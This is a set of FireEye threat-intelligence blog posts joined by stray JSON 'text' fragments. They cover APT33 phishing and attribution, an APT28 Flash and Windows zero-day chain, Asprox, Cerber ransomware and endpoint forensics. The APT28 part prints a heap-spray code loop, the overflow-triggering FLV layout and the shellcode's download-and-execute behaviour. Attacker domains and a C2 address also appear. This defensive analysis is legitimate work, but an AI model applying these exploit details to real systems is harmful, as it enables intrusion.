Iran’s desire to expand its own petrochemical production and improve its competitiveness within the region. The generalized targeting of organizations involved in energy and petrochemicals mirrors previously observed targeting by other suspected Iranian threat groups, indicating a common interest in the sectors across Iranian actors. Figure 1 shows the global scope of APT33 targeting. Figure 1: Scope of APT33 Targeting Spear Phishing APT33 sent spear phishing emails to employees whose jobs related to the aviation industry. These emails included recruitment themed lures and contained links to malicious HTML application (.hta) files. The .hta files contained job descriptions and links to legitimate job postings on popular employment websites that would be relevant to the targeted individuals. An example .hta file excerpt is provided in Figure 2. To the user, the file would appear as benign references to legitimate job postings; however, unbeknownst to the user, the .hta file also contained embedded code that automatically downloaded a custom APT33 backdoor. Figure 2: Excerpt of an APT33 malicious .hta file We assess APT33 used a built-in phishing module within the publicly available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear phishing emails to targeted individuals in 2016. Many of the phishing emails appeared legitimate – they referenced a specific job opportunity and salary, provided a link to the spoofed company’s employment website, and even included the spoofed company’s Equal Opportunity hiring statement. However, in a few cases, APT33 operators left in the default values of the shell’s phishing module. These appear to be mistakes, as minutes after sending the emails with the default values, APT33 sent emails to the same recipients with the default values removed. As shown in Figure 3, the “fake mail” phishing module in the ALFA Shell contains default values, including the sender email address (solevisible@gmail[.]com), subject line (“your site hacked by me”), and email body (“Hi Dear Admin”). Figure 3: ALFA TEaM Shell v2-Fake Mail (Default) Figure 4 shows an example email containing the default values the shell. Figure 4: Example Email Generated by the ALFA Shell with Default Values Domain Masquerading APT33 registered multiple domains that masquerade as Saudi Arabian aviation companies and Western organizations that together have partnerships to provide training, maintenance and support for Saudi’s military and commercial fleet. Based on observed targeting patterns, APT33 likely used these domains in spear phishing emails to target victim organizations. The following domains masquerade as these organizations: Boeing, Alsalam Aircraft Company, Northrop Grumman Aviation Arabia (NGAAKSA), and Vinnell Arabia. boeing.servehttp[.]com alsalam.ddns[.]net ngaaksa.ddns[.]net ngaaksa.sytes[.]net vinnellarabia.myftp[.]org Boeing, Alsalam Aircraft company, and Saudia Aerospace Engineering Industries entered into a joint venture to create the Saudi Rotorcraft Support Center in Saudi Arabia in 2015 with the goal of servicing Saudi Arabia’s rotorcraft fleet and building a self-sustaining workforce in the Saudi aerospace supply base. Alsalam Aircraft Company also offers military and commercial maintenance, technical support, and interior design and refurbishment services. Two of the domains appeared to mimic Northrop Grumman joint ventures. These joint ventures – Vinnell Arabia and Northrop Grumman Aviation Arabia – provide aviation support in the Middle East, specifically in Saudi Arabia. Both Vinnell Arabia and Northrop Grumman Aviation Arabia have been involved in contracts to train Saudi Arabia’s Ministry of National Guard. Identified Persona Linked to Iranian Government We identified APT33 malware tied to an Iranian persona who may have been employed by the Iranian government to conduct cyber threat activity against its adversaries. We assess an actor using the handle “xman_1365_x” may have been involved in the development and potential use of APT33’s TURNEDUP backdoor due to the inclusion of the handle in the processing-debugging (PDB) paths of many of TURNEDUP samples. An example can be seen in Figure 5. Figure 5: “xman_1365_x\" PDB String in TURNEDUP Sample Xman_1365_x was also a community manager in the Barnamenevis Iranian programming and software engineering forum, and registered accounts in the well-known Iranian Shabgard and Ashiyane forums, though we did not find evidence to suggest that this actor was ever a formal member of the Shabgard or Ashiyane hacktivist groups. Open source reporting links the “xman_1365_x” actor to the “Nasr Institute,” which is purported to be equivalent to Iran’s “cyber army” and controlled by the Iranian government. Separately, additional evidence ties the “Nasr Institute” to the 2011-2013 attacks on the financial industry, a series of denial of service attacks dubbed Operation Ababil. In March 2016, the U.S. Department of Justice unsealed an indictment that named two individuals allegedly hired by the Iranian government to build attack infrastructure and conduct distributed denial of service attacks in support of Operation Ababil. While the individuals and the activity described in indictment are different than what is discussed in this report, it provides some evidence that individuals associated with the “Nasr Institute” may have ties to the Iranian government. Potential Ties to Destructive Capabilities and Comparisons with SHAMOON One of the droppers used by APT33, which we refer to as DROPSHOT, has been linked to the wiper malware SHAPESHIFT. Open source research indicates SHAPESHIFT may have been used to target organizations in Saudi Arabia. Although we have only directly observed APT33 use DROPSHOT to deliver the TURNEDUP backdoor, we have identified multiple DROPSHOT samples in the wild that drop SHAPESHIFT. The SHAPESHIFT malware is capable of wiping disks, erasing volumes and deleting files, depending on its configuration. Both DROPSHOT and SHAPESHIFT contain Farsi language artifacts, which indicates they may have been developed by a Farsi language speaker (Farsi is the predominant and official language of Iran). While we have not directly observed APT33 use SHAPESHIFT or otherwise carry out destructive operations, APT33 is the only group that we have observed use the DROPSHOT dropper. It is possible that DROPSHOT may be shared amongst Iran-based threat groups, but we do not have any evidence that this is the case. In March 2017, Kasperksy released a report that compared DROPSHOT (which they call Stonedrill) with the most recent variant of SHAMOON (referred to as Shamoon 2.0). They stated that both wipers employ anti-emulation techniques and were used to target organizations in Saudi Arabia, but also mentioned several differences. For example, they stated DROPSHOT uses more advanced anti-emulation techniques, utilizes external scripts for self-deletion, and uses memory injection versus external drivers for deployment. Kaspersky also noted the difference in resource language sections: SHAMOON embeds Arabic-Yemen language resources while DROPSHOT embeds Farsi (Persian) language resources. We have also observed differences in both targeting and tactics, techniques and procedures (TTPs) associated with the group using SHAMOON and APT33. For example, we have observed SHAMOON being used to target government organizations in the Middle East, whereas APT33 has targeted several commercial organizations both in the Middle East and globally. APT33 has also utilized a wide range of custom and publicly available tools during their operations. In contrast, we have not observed the full lifecycle of operations associated with SHAMOON, in part due to the wiper removing artifacts of the earlier stages of the attack lifecycle. Regardless of whether DROPSHOT is exclusive to APT33, both the malware and the threat activity appear to be distinct from the group using SHAMOON. Therefore, we assess there may be multiple Iran-based threat groups capable of carrying out destructive operations. Additional Ties Bolster Attribution to Iran APT33’s targeting of organizations involved in aerospace and energy most closely aligns with nation-state interests, implying that the threat actor is most likely government sponsored. This coupled with the timing of operations – which coincides with Iranian working hours – and the use of multiple Iranian hacker tools and name servers bolsters our assessment that APT33 may have operated on behalf of the Iranian government. The times of day that APT33 threat actors were active suggests that they were operating in a time zone close to 04:30 hours ahead of Coordinated Universal Time (UTC). The time of the observed attacker activity coincides with Iran’s Daylight Time , which is +0430 UTC. APT33 largely operated on days that correspond to Iran’s workweek, Saturday to Wednesday. This is evident by the lack of attacker activity on Thursday, as shown in Figure 6. Public sources report that Iran works a Saturday to Wednesday or Saturday to Thursday work week, with government offices closed on Thursday and some private businesses operating on a half day schedule on Thursday. Many other Middle East countries have elected to have a Friday and Saturday weekend. Iran is one of few countries that subscribes to a Saturday to Wednesday workweek. APT33 leverages popular Iranian hacker tools and DNS servers used by other suspected Iranian threat groups. The publicly available backdoors and tools utilized by APT33 – including NANOCORE, NETWIRE, and ALFA Shell – are all available on Iranian hacking websites, associated with Iranian hackers, and used by other suspected Iranian threat groups. While not conclusive by itself, the use of publicly available Iranian hacking tools and popular Iranian hosting companies may be a result of APT33’s familiarity with them and lends support to the assessment that APT33 may be based in Iran. Figure 6: APT33 Interactive Commands by Day of Week Outlook and Implications Based on observed targeting, we believe APT33 engages in strategic espionage by targeting geographically diverse organizations across multiple industries. Specifically, the targeting of organizations in the aerospace and energy sectors indicates that the threat group is likely in search of strategic intelligence capable of benefitting a government or military sponsor. APT33’s focus on aviation may indicate the group’s desire to gain insight into regional military aviation capabilities to enhance Iran’s aviation capabilities or to support Iran’s military and strategic decision making. Their targeting of multiple holding companies and organizations in the energy sectors align with Iranian national priorities for growth, especially as it relates to increasing petrochemical production. We expect APT33 activity will continue to cover a broad scope of targeted entities, and may spread into other regions and sectors as Iranian interests dictate. APT33’s use of multiple custom backdoors suggests that they have access to some of their own development resources, with which they can support their operations, while also making use of publicly available tools. The ties to SHAPESHIFT may suggest that APT33 engages in destructive operations or that they share tools or a developer with another Iran-based threat group that conducts destructive operations.

                "text": "FireEye Labs recently detected a limited APT campaign exploiting zero-day vulnerabilities in Adobe Flash and a brand-new one in Microsoft Windows. Using the Dynamic Threat Intelligence Cloud (DTI) , FireEye researchers detected a pattern of attacks beginning on April 13 th , 2015. Adobe independently patched the vulnerability (CVE-2015-3043) in APSB15-06 . Through correlation of technical indicators and command and control infrastructure, FireEye assess that APT28 is probably responsible for this activity. Microsoft is aware of the outstanding local privilege escalation vulnerability in Windows (CVE-2015-1701). While there is not yet a patch available for the Windows vulnerability, updating Adobe Flash to the latest version will render this in-the-wild exploit innocuous. We have only seen CVE-2015-1701 in use in conjunction with the Adobe Flash exploit for CVE-2015-3043. The Microsoft Security Team is working on a fix for CVE-2015-1701. Exploit Overview The high level flow of the exploit is as follows: 1.       User clicks link to attacker controlled website 2.       HTML/JS launcher page serves Flash exploit 3.       Flash exploit triggers CVE-2015-3043, executes shellcode 4.       Shellcode downloads and runs executable payload 5.       Executable payload exploits local privilege escalation (CVE-2015-1701) to steal System token The Flash exploit is served from unobfuscated HTML/JS. The launcher page picks one of two Flash files to deliver depending upon the target’s platform (Windows 32 versus 64bits). The Flash exploit is mostly unobfuscated with only some light variable name mangling. The attackers relied heavily on the CVE-2014-0515 Metasploit module, which is well documented. It is ROPless, and instead constructs a fake vtable for a FileReference object that is modified for each call to a Windows API. The payload exploits a local privilege escalation vulnerability in the Windows kernel if it detects that it is running with limited privileges. It uses the vulnerability to run code from userspace in the context of the kernel, which modifies the attacker’s process token to have the same privileges as that of the System process. CVE-2015-3043 Exploit The primary difference between the CVE-2014-0515 metasploit module and this exploit is, obviously, the vulnerability. CVE-2014-0515 exploits a vulnerability in Flash’s Shader processing, whereas CVE-2015-3043 exploits a vulnerability in Flash’s FLV processing. The culprit FLV file is embedded within AS3 in two chunks, and is reassembled at runtime. Vulnerability A buffer overflow vulnerability exists in Adobe Flash Player (<=17.0.0.134) when parsing malformed FLV objects. Attackers exploiting the vulnerability can corrupt memory and gain remote code execution. In the exploit, the attacker embeds the FLV object directly in the ActionScript code, and plays the video using NetStream class.

In Flash, these objects are created when parsing FLV Tags: .text:1018ACE9 sub_1018ACE9    proc near               ; CODE XREF: sub_1018BBAC+2Bp .text:1018ACE9                                         ; sub_10192797+1A1p ... .text:1018ACE9 .text:1018ACE9 arg_0           = dword ptr  4 .text:1018ACE9 .text:1018ACE9                 mov     eax, ecx .text:1018ACEB                 mov     ecx, [esp+arg_0] .text:1018ACEF                 mov     dword ptr [eax], offset off_10BA771C .text:1018ACF5                 mov     dword ptr [eax+24h], 1 .text:1018ACFC                 and     dword ptr [eax+14h], 0 .text:1018AD00                 mov     [eax+28h], ecx .text:1018AD03                 mov     byte ptr [eax+20h], 0 .text:1018AD07                 retn    4 .text:1018AD07 sub_1018ACE9    endp In the case of this exploit, a Tag structure begins at offset 0x3b2f into the FLV stream that, when parsed, populates the Tag structure as follows: Tag 2: UINT_8 type: 8 UINT_24 datasize: 1089 UINT_24 timestamp: 15 UINT_8 timestamphi: 0 UINT_24 streamid: 0 UINT_4 fmt: 6 UINT_2 sr: 2 UINT_1 bits: 0 UINT_1 channels: 0 UBYTE data[1088]: \\xee\\xee\\xee\\xee… UINT_32 lastsize: 0xeeeeeeee Beginning within the data field, all contents of the FLV stream become 0xEE. Consequently, the data and lastsize fields are mangled, and one final tag technically exists consisting exclusively of 0xEE: Tag 3: UINT_8 type: 0xEE UINT_24 datasize: 0xEEEEEE … One can see the datasize field of Tag2 populated from the attacker's FLV stream below: .text:10192943                 mov     eax, [ebx+24h] .text:10192946                 mov     [esi+14h], eax .text:10192949                 movzx   eax, byte ptr [ebx+19h] ; 00 .text:1019294D                 movzx   ecx, byte ptr [ebx+1Ah] ; 04 .text:10192951                 shl     eax, 8 .text:10192954                 or      eax, ecx .text:10192956                 movzx   ecx, byte ptr [ebx+1Bh] ; 41 .text:1019295A                 shl     eax, 8 .text:1019295D                 or      eax, ecx .text:1019295F                 mov     ecx, ebx .text:10192961                 mov     [esi+0Ch], eax  ; 0x441 .text:10192964                 call    sub_1002E2B3 The buffer is allocated with fixed size 0x2000: .text:101A647E                 push    2000h .text:101A6483                 mov     ecx, esi .text:101A6485                 call    sub_101A6257    ; alloc 0x2000 buffer, store in esi+0xDC …… .text:101A627F                 push    0 .text:101A6281                 push    edi             ; 0x2000 .text:101A6282                 call    sub_105EBEB0 .text:101A6287                 pop     ecx .text:101A6288                 pop     ecx .text:101A6289                 mov     [esi+0DCh], eax Since the size is controlled by the attacker, it’s possible to overflow the fixed size buffer with certain data. A datasize of 0x441 results in a value here of 0x1100 passed to sub_100F88F8, which memcopies 0x2200 bytes in 0x11 chunks of 0x200. The last memcpy overflows the fixed size 0x2000 buffer into a adjacent heap memory. Attackers spray the heap with array of Vector, 0x7fe * 4 + 8 == 0x2000, and create holes of such size, which will be allocated by the said object. while (_local_2 < this._bp35) // _bp35 == 0x2000 { this._ok47[_local_2] = new Vector.<uint>(this._lb60); // _lb60 == 0x07FE _local_3 = 0x00; while (_local_3 < this._lb60) { this._ok47[_local_2][_local_3] = 0x41414141; _local_3++; }; _local_2 = (_local_2 + 0x01); }; _local_2 = 0x00; while (_local_2 < this._bp35) { this._ok47[_local_2] = null; _local_2 = (_local_2 + 0x02); }; As the previous picture demonstrated, the followed Vector object’s length field being overflowed as 0x80007fff, which enables the attacker to read/write arbitrary data within user space. Shellcode Shellcode is passed to the exploit from HTML in flashvars. The shellcode downloads the next stage payload, which is an executable passed in plaintext, to the temp directory with UrlDownloadToFileA, which it then runs with WinExec. Payload & C2 This exploit delivers a malware variant that shares characteristics with the APT28 backdoors CHOPSTICK and CORESHELL malware families, both described in our APT28 whitepaper .  The malware uses an RC4 encryption key that was previously used by the CHOPSTICK backdoor.  And the C2 messages include a checksum algorithm that resembles those used in CHOPSTICK backdoor communications.  In addition, the network beacon traffic for the new malware resembles those used by the CORESHELL backdoor.  Like CORESHELL, one of the beacons includes a process listing from the victim host.  And like CORESHELL, the new malware attempts to download a second-stage executable. One of the C2 locations for the new payload, 87.236.215[.]246 , also hosts a suspected APT28 domain ssl-icloud[.]com .  The same subnet ( 87.236.215.0/24 ) also hosts several known or suspected APT28 domains, as seen in Table 1. The target firm is an international government entity in an industry vertical that aligns with known APT28 targeting. CVE-2015-1701 Exploit The payload contains an exploit for the unpatched local privilege escalation vulnerability CVE-2015-1701 in Microsoft Windows. The exploit uses CVE-2015-1701 to execute a callback in userspace. The callback gets the EPROCESS structures of the current process and the System process, and copies data from the System token into the token of the current process. Upon completion, the payload continues execution in usermode with the privileges of the System process. Because CVE-2015-3043 is already patched, this remote exploit will not succeed on a fully patched system. If an attacker wanted to exploit CVE-2015-1701, they would first have to be executing code on the victim’s machine. Barring authorized access to the victim’s machine, the attacker would have to find some other means, such as crafting a new Flash exploit, to deliver a CVE-2015-1701 payload. Microsoft is aware of CVE-2015-1701 and is working on a fix. CVE-2015-1701 does not affect Windows 8 and later. Acknowledgements Thank you to all of the contributors to this blog!

                "text": "Executive Summary FireEye Labs has been tracking a recent spike in malicious email detections that we attribute to a campaign that began in 2013. While malicious email campaigns are nothing new, this one is significant in that we are observing mass-targeting attackers adopting the malware evasion methods pioneered by the stealthier APT attackers. And this is certainly a high-volume business, with anywhere from a few hundred to ten thousand malicious emails sent daily – usually distributing between 50 and 500,000 emails per outbreak. Through the FireEye Dynamic Threat Intelligence (DTI) cloud , FireEye Labs discovered that each and every major spike in email blasts brought a change in the attributes of their attack. These changes have made it difficult for anti-virus, IPS, firewalls and file-based sandboxes to keep up with the malware and effectively protect endpoints from infection. Worse, if past is prologue, we can expect other malicious, mass-targeting email operators to adopt this approach to bypass traditional defenses. This blog will cover the trends of the campaign, as well as provide a short technical analysis of the payload. Campaign Details Figure 1: Attack Architecture The campaign first appeared in late December of 2013 and has since been seen in fairly cyclical patterns each month. It appears that the threat actors behind this campaign are fairly responsive to published blogs and reports surrounding their malware techniques, tweaking their malware accordingly to continuously try and evade detection with success. In late 2013, malware labeled as Kuluoz, the specific spam component of the Asprox botnet, was discovered to be the main payload of what would become the first malicious email campaign. Since then, the threat actors have continuously tweaked the malware by changing its hardcoded strings, remote access commands, and encryption keys. Previously, Asprox malicious email campaigns targeted various industries in multiple countries and included a URL link in the body. The current version of Asprox includes a simple zipped email attachment that contains the malicious payload “exe.” Figure 2 below represents a sample message while Figure 3 is an example of the various court-related email headers used in the campaign. Figure 2 Email Sample Figure 3 Email Headers Some of the recurring campaign that Asporox used includes themes focused around airline tickets, postal services and license keys. In recent months however, the court notice and court request-themed emails appear to be the most successful phishing scheme theme for the campaign. The following list contains examples of email subject variations, specifically for the court notice theme: Urgent court notice Notice to Appear in Court Notice of appearance in court Warrant to appear Pretrial notice Court hearing notice Hearing of your case Mandatory court appearance The campaign appeared to increase in volume during the month of May. Figure 4 shows the increase in activity of Asprox compared to other crimewares towards the end of May specifically. Figure 5 highlights the regular monthly pattern of overall malicious emails. In comparison, Figure 6 is a compilation of all the hits from our analytics. Figure 4 Worldwide Crimeware Activity Figure 5 Overall Asprox Botnet tracking Figure 6 Asprox Botnet Activity Unique Samples These malicious email campaign spikes revealed that FireEye appliances, with the support of DTI cloud, were able to provide a full picture of the campaign (blue), while only a fraction of the emailed malware samples could be detected by various Anti-Virus vendors (yellow). Figure 7 FireEye Detection vs. Anti-Virus Detection By the end of May, we observed a big spike on the unique binaries associated with this malicious activity. Compared to the previous days where malware authors used just 10-40 unique MD5s or less per day, we saw about 6400 unique MD5s sent out on May 29 th . That is a 16,000% increase in unique MD5s over the usual malicious email campaign we’d observed. Compared to other recent email campaigns, Asprox uses a volume of unique samples for its campaign. Figure 8 Asprox Campaign Unique Sample Tracking Figure 9 Geographical Distribution of the Campaign Figure 10 Distribution of Industries Affected Brief Technical Analysis Figure 11 Attack Architecture Infiltration The infiltration phase consists of the victim receiving a phishing email with a zipped attachment containing the malware payload disguised as an Office document. Figure 11 is an example of one of the more recent phishing attempts. Figure 12 Malware Payload Icon Evasion Once the victim executes the malicious payload, it begins to start an svchost.exe process and then injects its code into the newly created process. Once loaded into memory, the injected code is then unpacked as a DLL. Notice that Asprox uses a hardcoded mutex that can be found in its strings. Typical Mutex Generation \"2GVWNQJz1\" Create svchost.exe process Code injection into svchost.exe Entrenchment Once the dll is running in memory it then creates a copy of itself in the following location: %LOCALAPPDATA%/[8 CHARACTERS].EXE Example filename: %LOCALAPPDATA%\\lwftkkea.exe It’s important to note that the process will first check itself in the startup registry key, so a compromised endpoint will have the following registry populated with the executable: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Exfiltration/Communication The malware uses various encryption techniques to communicate with the command and control (C2) nodes. The communication uses an RSA (i.e. PROV_RSA_FULL) encrypted SSL session using the Microsoft Base Cryptographic Provider while the payloads themselves are RC4 encrypted. Each sample uses a default hardcoded public key shown below.

And, with each new improvement, it becomes more difficult for traditional security methods to detect certain types of malware. Acknowledgements : Nart Villeneuve, Jessa dela Torre, and David Sancho.

                "text": "FireEye has just released its 2013 Advanced Threat Report (ATR), which provides a high-level overview of the computer network attacks that FireEye discovered last year. In this ATR, we focused almost exclusively on a small, but very important subset of our overall data analysis – the advanced persistent threat (APT). APTs, due to their organizational structure, mission focus, and likely some level of nation-state support, often pose a more serious danger to enterprises than a lone hacker or hacker group ever could. Over the long term, APTs are capable of cyber attacks that can rise to a strategic level, including widespread intellectual property theft, espionage, and attacks on national critical infrastructures. The data contained in this report is gleaned from the FireEye Dynamic Threat Intelligence (DTI) cloud , and is based on attack metrics shared by FireEye customers around the world. Its insight is derived from: 39,504 cyber security incidents 17,995 malware infections 4,192 APT incidents 22 million command and control (CnC) communications 159 APT-associated malware families CnC infrastructure in 206 countries and territories Based on our data, the U.S., South Korea, and Canada were the top APT targets in 2013; the U.S., Canada, and Germany were targeted by the highest number of unique malware families. The ATR describes attacks on 20+ industry verticals. Education, Finance, and High-Tech were the top overall targets, while Government, Services/Consulting, and High-Tech were targeted by the highest number of unique malware families. In 2013, FireEye discovered eleven zero-day attacks. In the first half of the year, Java was the most common target for zero-days; in the second half, FireEye observed a surge in Internet Explorer (IE) zero-days that were used in watering hole attacks, including against U.S. government websites. Last year, FireEye analyzed five times more Web-based security alerts than email-based alerts – possibly stemming from an increased awareness of spear phishing as well as a more widespread use of social media. In sum, the 2013 ATR offers strong evidence that malware infections occur within enterprises at an alarming rate, that attacker infrastructure is global in scope, and that advanced attackers continue to penetrate legacy defenses, such as firewalls and anti-virus (AV), with ease.

                "text": "To understand what a threat actor did on a Windows system, analysts often turn to the tried and true sources of historical endpoint artifacts such as the Master File Table (MFT), registry hives, and Application Compatibility Cache (AppCompat). However, these evidence sources were not designed with detection or incident response in mind; crucial details may be omitted or cleared through anti-forensic methods. By looking at historical evidence alone, an analyst may not see the full story. Real-time events can be thought of as forensic artifacts specifically designed for detection and incident response, implemented through Enterprise Detection and Response (EDR) solutions or enhanced logging implementations like Sysmon . During active-attacker endpoint investigations, FireEye Mandiant has found real-time events to be useful in filling in the gaps of what an attacker did. These events record different types of system activities such as process execution, file write activity, network connections, and more. During incident response engagements, Mandiant uses FireEye Endpoint Security to track endpoint system events in real-time. This feature allows investigators to track an attacker on any system by alerting on and reviewing these real-time events. An analyst can use our solution’s built-in Audit Viewer or Redline to review real-time events. Let’s look at some examples of Windows real-time events available on our solution and how they can be leveraged during an investigation. Let’s assume the account TEST-DOMAIN\\BackupAdmin was an inactive Administrator account compromised by an attacker. Please note the examples provided in this post are based on real-time events observed during engagements but have been recreated or altered to preserve client confidentiality. Process Execution Events There are many historical process execution artifacts including AppCompat , AmCache , WMI CCM_RecentlyUsedApps , and more . A single artifact rarely covers all the useful details relating to a process's execution, but real-time process execution events change that. Our solution’s real-time process execution events record execution time, full process path, process identification number (PID), parent process path, parent PID, user, command line arguments, and even the process MD5 hash. Table 1 provides an example of a real-time process execution event recorded by our solution. Field Example Timestamp (UTC) 2020-03-10 16:40:58.235 Sequence Number 2879512 PID 9392 Process Path C:\\Windows\\Temp\\legitservice.exe Username TEST-DOMAIN\\BackupAdmin Parent PID 9103 Parent Process Path C:\\Windows\\System32\\cmd.exe EventType Start ProcessCmdLine \"C:\\Windows\\Temp\\legitservice.exe\"  -b -m Process MD5 Hash a823bc31395539816e8e4664e884550f Table 1: Example real-time process execution event Based on this real-time process execution event, the process C:\\Windows\\System32\\cmd.exe with PID 9103 executed the file C:\\Windows\\Temp\\legitservice.exe with PID 9392 and the MD5 hash a823bc31395539816e8e4664e884550f . This new process used the command line arguments -b -m under the user context of TEST-DOMAIN\\BackupAdmin . We can compare this real-time event with what an analyst might see in other process execution artifacts. Table 2 provides an example AppCompat entry for the same executed process. Note the recorded timestamp is for the last modified time of the file, not the process start time. Field Example File Last Modified (UTC) 2020-03-07 23:48:09 File Path C:\\Windows\\Temp\\legitservice.exe Executed Flag TRUE Table 2: Example AppCompat entry Table 3 provides an example AmCache entry. Note the last modified time of the registry key can usually be used to determine the process start time and this artifact includes the SHA1 hash of the file. Field Example Registry Key Last Modified (UTC) 2020-03-10 16:40:58 File Path C:\\Windows\\Temp\\legitservice.exe File Sha1 Hash 2b2e04ab822ef34969b7d04642bae47385be425c Table 3: Example AmCache entry Table 4 provides an example Windows Event Log process creation event. Note this artifact includes the PID in hexadecimal notation, details about the parent process, and even a field for where the process command line arguments should be. In this example the command line arguments are not present because they are disabled by default and Mandiant rarely sees this policy enabled by clients on investigations.

File Write Events An attacker may choose to modify or delete important evidence. If an attacker uses a file shredding tool like Sysinternal’s SDelete, it is unlikely the analyst will recover the original contents of the file. Our solution’s real-time file write events are incredibly useful in situations like this because they record the MD5 hash of the files written and partial contents of the file. File write events also record which process created or modified the file in question. Table 5 provides an example of a real-time file write event recorded by our solution. Field Example Timestamp (UTC) 2020-03-10 16:42:59.956 Sequence Number 2884312 PID 9392 Process Path C:\\Windows\\Temp\\legitservice.exe Username TEST-DOMAIN\\BackupAdmin Device Path \\Device\\HarddiskVolume2 File Path C:\\Windows\\Temp\\WindowsServiceNT.log File MD5 Hash 30a82a8a864b6407baf9955822ded8f9 Num Bytes Seen Written 8 Size 658 Writes 4 Event reason File closed Closed TRUE Base64 Encoded Data At Lowest Offset Q3JlYXRpbmcgJ1dpbmRvd3NTZXJ2aWNlTlQubG9nJy Bsb2dmaWxlIDogT0sNCm1pbWlrYXR6KGNvbW1hbmQ Text At Lowest Offset Creating 'WindowsServiceNT.log' logfile : OK....mimikatz(command Table 5: Example real-time file write event Based on this real-time file write event, the malicious executable C:\\Windows\\Temp\\legitservice.exe wrote the file C:\\Windows\\Temp\\WindowsServiceNT.log to disk with the MD5 hash 30a82a8a864b6407baf9955822ded8f9 . Since the real-time event recorded the beginning of the written file, we can determine the file likely contained Mimikatz credential harvester output which Mandiant has observed commonly starts with OK....mimikatz . If we investigate a little later, we’ll see a process creation event for C:\\Windows\\Temp\\taskassist.exe with the MD5 file hash 2b5cb081721b8ba454713119be062491 followed by several file write events for this process summarized in Table 6. Timestamp File Path File Size 2020-03-10 16:53:42.351 C:\\Windows\\Temp\\WindowsServiceNT.log 638 2020-03-10 16:53:42.351 C:\\Windows\\Temp\\AAAAAAAAAAAAAAAA.AAA 638 2020-03-10 16:53:42.351 C:\\Windows\\Temp\\BBBBBBBBBBBBBBBB.BBB 638 2020-03-10 16:53:42.351 C:\\Windows\\Temp\\CCCCCCCCCCCCCCCC.CCC 638 … 2020-03-10 16:53:42.382 C:\\Windows\\Temp\\XXXXXXXXXXXXXXXX.XXX 638 2020-03-10 16:53:42.382 C:\\Windows\\Temp\\YYYYYYYYYYYYYYYY.YYY 638 2020-03-10 16:53:42.382 C:\\Windows\\Temp\\ZZZZZZZZZZZZZZZZ.ZZZ 638 Table 6: Example timeline of SDelete File write events Admittedly, this activity may seem strange at a first glance. If we do some research on the its file hash, we’ll see the process is actually SDelete masquerading as C:\\Windows\\Temp\\taskassist.exe . As part of its secure deletion process, SDelete renames the file 26 times in a successive alphabetic manner. Network Events Incident responders rarely see evidence of network communication from historical evidence on an endpoint without enhanced logging. Usually, Mandiant relies on NetFlow data, network sensors with full or partial packet capture, or malware analysis to determine the command and control (C2) servers with which a malware sample can communicate. Our solution’s real-time network events record both local and remote network ports, the leveraged protocol, and the relevant process. Table 7 provides an example of a real-time IPv4 network event recorded by our solution. Field Example Timestamp (UTC) 2020-03-10 16:46:51.690 Sequence Number 2895588 PID 9392 Process + Path C:\\Windows\\Temp\\legitservice.exe Username TEST-DOMAIN\\BackupAdmin Local IP Address 10.0.0.52 Local Port 57472 Remote IP Address 10.0.0.51 Remote Port 443 Protocol TCP Table 7: Example real-time network connection event Based on this real-time IPv4 network event, the malicious executable C:\\Windows\\Temp\\legitservice.exe made an outbound TCP connection to 10.0.0.51:443 . Registry Key Events By using historical evidence to investigate relevant timeframes and commonly abused registry keys, we can identify malicious or leveraged keys. Real-time registry key events are useful for linking processes to the modified registry keys. They can also show when an attacker deletes or renames a registry key. This is useful to an analyst because the only available timestamp recorded in the registry is the last modified time of a registry key, and this timestamp is updated if a parent key is updated. Table 8 provides an example of a real-time registry key event recorded by our solution. Field Example Timestamp (UTC) 2020-03-10 16:46:56.409 Sequence Number 2898196 PID 9392 Process + Path C:\\Windows\\Temp\\legitservice.exe Username TEST-DOMAIN\\BackupAdmin Event Type 3 Path HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ LegitWindowsService\\ImagePath Key Path CurrentControlSet\\Services\\LegitWindowsService Original Path HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\LegitWindowsService Value Name ImagePath Value Type REG_EXPAND_SZ Base64 Encoded Value QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABsAG UAZwBpAHQAcwBlAHIAdgBpAGMAZQAuAGUAeABlAAAAAA== Text C:\\Windows\\Temp\\legitservice.exe Table 8: Example real-time registry key event For our solution's real-time registry events, we can map the event type to the operation performed using Table 9. Event Type Value Operation 1 PreSetValueKey 2 PreDeleteValueKey 3 PostCreateKey, PostCreateKeyEx, PreCreateKeyEx 4 PreDeleteKey 5 PreRenameKey Table 9: FireEye Endpoint Security real-time registry key event types Based on this real-time registry key event, the malicious executable C:\\Windows\\Temp\\legitservice.exe created the Windows service LegitWindowsService . If we investigated the surrounding registry keys, we might identify even more information about this malicious service. Conclusion The availability of real-time events designed for forensic analysis can fill in gaps that traditional forensic artifacts cannot on their own. Mandiant has seen great value in using real-time events during active-attacker investigations. We have used real-time events to determine the functionality of attacker utilities that were no longer present on disk, to determine users and source network addresses used during malicious remote desktop activity when expected corresponding event logs were missing, and more.

                "text": "Ransomware is a common method of cyber extortion for financial gain that typically involves users being unable to interact with their files, applications or systems until a ransom is paid. Accessibility of cryptocurrency such as Bitcoin has directly contributed to this ransomware model. Based on data from FireEye Dynamic Threat Intelligence (DTI), ransomware activities have been rising fairly steadily since mid-2015. On June 10, 2016, FireEye’s HX detected a Cerber ransomware campaign involving the distribution of emails with a malicious Microsoft Word document attached. If a recipient were to open the document a malicious macro would contact an attacker-controlled website to download and install the Cerber family of ransomware. Exploit Guard, a major new feature of FireEye Endpoint Security (HX) , detected the threat and alerted HX customers on infections in the field so that organizations could inhibit the deployment of Cerber ransomware. After investigating further, the FireEye research team worked with security agency CERT-Netherlands, as well as web hosting providers who unknowingly hosted the Cerber installer, and were able to shut down that instance of the Cerber command and control (C2) within hours of detecting the activity. With the attacker-controlled servers offline, macros and other malicious payloads configured to download are incapable of infecting users with ransomware. FireEye hasn’t seen any additional infections from this attacker since shutting down the C2 server, although the attacker could configure one or more additional C2 servers and resume the campaign at any time. This particular campaign was observed on six unique endpoints from three different FireEye endpoint security customers. HX has proven effective at detecting and inhibiting the success of Cerber malware. Attack Process The Cerber ransomware attack cycle we observed can be broadly broken down into eight steps: Target receives and opens a Word document. Macro in document is invoked to run PowerShell in hidden mode. Control is passed to PowerShell, which connects to a malicious site to download the ransomware. On successful connection, the ransomware is written to the disk of the victim. PowerShell executes the ransomware. The malware configures multiple concurrent persistence mechanisms by creating command processor, screensaver, startup.run and runonce registry entries. The executable 